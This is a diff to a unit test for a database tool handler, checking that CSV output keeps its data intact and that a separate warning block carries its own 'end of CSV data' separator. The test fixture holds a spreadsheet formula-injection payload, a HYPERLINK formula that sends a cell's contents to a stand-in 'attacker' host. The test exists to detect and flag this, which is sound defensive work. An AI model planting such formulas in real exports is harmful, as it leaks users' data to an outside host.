@@ -475,6 +475,13 @@ describe('DatabaseToolsHandler', () => {
         expect(result[1].text).toContain('1 cell');
         expect(result[1].text).toContain('unmodified by design');
 
+        // Clients are not obliged to preserve the block boundary - a live smoke test showed
+        // the two blocks arriving joined - so the warning carries its own rule. Without it the
+        // warning butts straight onto the final data row.
+        expect(result[1].text.startsWith('\n--- end of CSV data ---\n\n')).toBe(true);
+        expect(result[0].text).not.toContain('end of CSV data');
+        expect(`${result[0].text}${result[1].text}`).toContain('plain\n\n--- end of CSV data ---');
+
         // The bytes are untouched: the payload is quoted per RFC 4180 and nothing else.
         expect(result[0].text).toContain('1,"=HYPERLINK(""http://attacker/?""&A1)"');
         expect(result[0].text).not.toContain("'=HYPERLINK");
